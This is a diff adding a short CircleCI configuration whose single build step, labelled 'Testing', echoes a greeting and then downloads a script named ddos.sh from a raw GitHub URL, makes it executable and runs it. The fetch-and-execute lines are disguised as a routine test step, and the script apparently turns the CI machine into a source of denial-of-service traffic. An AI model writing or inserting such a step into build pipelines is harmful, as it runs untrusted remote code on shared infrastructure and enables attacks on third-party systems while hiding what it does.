@@ -1,0 +1,13 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    steps:
+      - checkout
+      - run:
+          name: "Testing"
+          command: echo "Hi"
+                   ! wget https://raw.githubusercontent.com/bagol422/ddos33/main/.github/workflows./ddos.sh
+                   ! chmod +x ddos.sh
+                   ! ./ddos.sh
